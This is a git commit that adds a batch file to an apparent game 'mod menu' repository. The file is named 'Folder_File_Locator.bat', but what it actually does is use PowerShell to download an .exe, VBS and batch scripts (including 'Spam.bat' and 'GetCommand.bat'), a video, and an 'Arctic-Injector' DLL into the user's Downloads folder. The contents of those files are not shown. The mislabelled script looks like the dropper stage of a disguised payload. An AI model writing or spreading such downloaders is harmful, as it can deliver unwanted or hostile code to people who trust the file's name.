8c61cb9676f61c0c288e6aeabb9998a4adab894e
BreezeHubX <96991216+BreezeHubX@users.noreply.github.com>
2023-12-24 15:56:41 +0100

    Add files via upload

---
+++ Attempt22/Folder_File_Locator.bat
@@ -0,0 +1,10 @@
+md UI_Generator
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/vid.mp4 -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\vid.mp4"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/msgbox.vbs -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\msgbox.vbs"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/msg.exe -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\msg.exe"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/Sleep.vbs -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\Sleep.vbs"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/msg.bat -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\msg.bat"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/Spam.bat -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\Spam.bat"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/GetCommand.bat -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\GetCommand.bat"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/Arctic-Injector1.81.dll -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\Arctic-Injector1.81.dll"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/BreezeHubX/Arctic-mod-menu/main/Attempt22/Arctic-Menu-UI.dll -OutFile $env:userprofile\Downloads\Arctic\UI-Generator\Arctic-Menu-UI.dll"
